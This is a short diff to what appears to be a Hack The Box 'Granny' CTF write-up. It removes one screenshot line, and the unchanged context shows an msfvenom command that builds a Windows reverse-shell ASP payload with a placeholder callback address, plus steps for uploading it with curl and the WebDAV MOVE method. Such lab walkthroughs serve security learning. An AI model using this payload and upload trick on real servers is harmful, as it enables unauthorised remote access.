@@ -57,7 +57,6 @@ Firstly a shell needs to be generated to upload to the web server. Since the ser
 asp as found in enumeration, an asp shell can be generated through msfvenom.
 
 `msfvenom -p windows/shell_reverse_tcp LHOST=IP_ADDRESS LPORT=PORT -f asp > rshell.asp`
-<img src="/assets/images/htb/granny/msfvenom-rshell.png">
 
 Curl is used for sending the reverse shell as a .txt file. Then the MOVE method is used
 to change the file extension to `.asp`.
